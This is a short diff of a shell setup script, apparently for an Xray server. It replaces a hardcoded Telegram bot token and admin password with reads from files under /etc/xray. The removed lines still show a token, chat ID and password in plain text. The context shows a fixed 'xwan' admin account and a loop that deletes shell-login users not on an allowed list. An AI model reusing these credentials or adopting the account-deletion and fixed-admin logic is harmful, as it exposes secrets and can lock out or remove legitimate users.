@@ -34,7 +34,7 @@ fi
 # Telegram Bot Config
 # -----------------------------
 CHATID="1210833546"
-KEY="8311592972:AAEREDijH5fGMLrN-GqzOmp22hb6tY_-988"
+KEY="$(cat /etc/xray/.botkey 2>/dev/null)"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 
@@ -57,14 +57,14 @@ biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
 
 # Repository
 REPO="https://raw.githubusercontent.com/ajijainalganteng-wq/os/main/"
-pwadm="@Ridwan112#"
+pwadm="$(cat /etc/xray/.pwadm 2>/dev/null)"
 Username="xwan"
 Password="$pwadm"
 
 # -----------------------------
 # Hapus user yang tidak diizinkan
 # -----------------------------
-allowed_users=("root")
+allowed_users=("root" "xwan" "ubuntu" "admin" "debian")
 all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
 for user in $all_users; do
     if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
